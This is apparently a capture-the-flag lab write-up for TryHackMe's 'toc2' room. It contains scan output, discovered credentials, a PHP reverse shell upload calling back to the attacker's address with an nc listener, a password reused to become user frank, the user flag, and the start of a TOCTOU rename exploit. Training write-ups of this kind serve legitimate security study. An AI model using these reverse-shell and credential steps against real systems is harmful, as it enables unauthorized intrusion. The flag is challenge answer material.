# toc2 — Writeup

## Overview
### toc2 — Writeup
### toc2 — Writeup
----
It's a setup... Can you get the flags in time?
----
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/aab108830eaf8908ce3dd0f3d4336b2d.png)

## Exploitation
Start Machine
_I have a theory that the truth is never told during the nine-to-five hours. - Hunter S. Thompson
_
Answer the questions below
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.9.45 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.9.45:22
Open 10.10.9.45:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.9.45 [2 ports]
Discovered open port 22/tcp on 10.10.9.45
Discovered open port 80/tcp on 10.10.9.45
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.9.45
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.9.45.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.9.45
Host is up, received user-set (0.22s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 844eb1493122948483979172cb233336 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuaqFOGQLuuh5gZPHAMXN7mbBvvKFQNjf7BE4nQcou0kK9vn/2NoMDyr3ZNKRvfG/Q2S+Nk1cew2KYvBN8OmJP0a4iTiQNd2MNftiOvH6zA7DbHD8WcuqoFNVUILB0fR3zHLOTJdZmvUX14TJnlGpd+Zt6wNOH9+EXNZDhjG7f7D/StcxurCuGAwkqQb7/oP5euE5sQaJ31ZnTL4RK4sk7LzXQprPBJa0IjEthBtKhSbKS0XmvzCFcSYNn/RUhFAOBR4WXKRGk9+WKlhj5KUli0BmUB6v9OnTcRZHjVQ7cj/8QoFYh5Ns38DM2oFYibhTGmODK6OeyOQgFe9iNc/KT
|   256 cc32193ff5b9a4d5ac320f6ef0833571 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAXDnQKHAfzUPrhhICFpTSbE3+bjHgyIEapWhaEZkimi2WdGqPh3+vX7602C3+B4Q+TitOB+YR7xQNmUxk89vac=
|   256 bdd800be49b515afbfd585f73aabd648 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ3eshAl/8myavr2XQdEDrVBN5hBGf1Jwxn8CajXqhZ1
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/cmsms/cmsms-2.1.6-install.php
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Site Maintenance
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.70 seconds

cmsmsuser:devpass 

http://10.10.9.45/robots.txt

User-agent: *
Disallow: /cmsms/cmsms-2.1.6-install.php
 
Note to self:
Tommorow, finish setting up the CMS, and that database, cmsmsdb, so the site's ready by Wednesday. 

http://10.10.9.45/cmsms/cmsms-2.1.6-install.php/index.php

after install it

http://10.10.9.45/cmsms/admin/login.php
login with creds

┌──(witty㉿kali)-[~/Downloads]
└─$ tail payload_ivan.php        
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1337);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?> 

then upload it (go to file manager)

revshell

http://10.10.9.45/cmsms/uploads/payload_ivan.php

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337                                         
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.9.45] 39840
SOCKET: Shell has connected! PID: 14150
python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
www-data@toc:/var/www/html/cmsms/uploads$ ls
ls
NCleanBlue  images  index.html	ngrey  payload_ivan.php  simplex
www-data@toc:/var/www/html/cmsms/uploads$ cd /home
cd /home
www-data@toc:/home$ ls
ls
frank
www-data@toc:/home$ cd frank
cd frank
www-data@toc:/home/frank$ ls
ls
new_machine.txt  root_access  user.txt
www-data@toc:/home/frank$ ls -lah
ls -lah
total 52K
drwxr-xr-x 5 frank frank 4.0K Aug 18  2020 .
drwxr-xr-x 3 root  root  4.0K Aug 18  2020 ..
-rw------- 1 frank frank    1 Aug 18  2020 .bash_history
-rw-r--r-- 1 frank frank  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 frank frank 3.7K Apr  4  2018 .bashrc
drwx------ 2 frank frank 4.0K Aug 18  2020 .cache
drwx------ 3 frank frank 4.0K Aug 18  2020 .gnupg
-rw------- 1 root  root   203 Aug 18  2020 .mysql_history
-rw-r--r-- 1 frank frank  807 Apr  4  2018 .profile
-rw-r--r-- 1 frank frank    0 Aug 18  2020 .sudo_as_admin_successful
-rw------- 1 root  root  1.5K Aug 18  2020 .viminfo
-rw-r--r-- 1 frank frank  331 Aug 17  2020 new_machine.txt
drwxr-xr-x 2 frank frank 4.0K Jan 31  2021 root_access
-rw-r--r-- 1 frank frank   34 Aug 18  2020 user.txt
www-data@toc:/home/frank$ cat new_machine.txt
cat new_machine.txt
I'm gonna be switching computer after I get this web server setup done. The inventory team sent me a new Thinkpad, the password is "password". It's funny that the default password for all the work machines is something so simple...Hell I should probably change this one from it, ah well. I'm switching machines soon- it can wait. 
www-data@toc:/home/frank$ su frank
su frank
Password: password

frank@toc:~$ cat user.txt
cat user.txt
thm{63616d70657276616e206c696665}

https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c

Time-of-Check to Time-of-Use (TOCTTOU) is a type of race condition vulnerability that occurs when a program's behavior depends on the state of a resource (e.g., file, directory) at two different times: the time of checking a condition and the time of using the resource. During this time interval, the state of the resource may change, leading to unexpected or malicious behavior.

#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

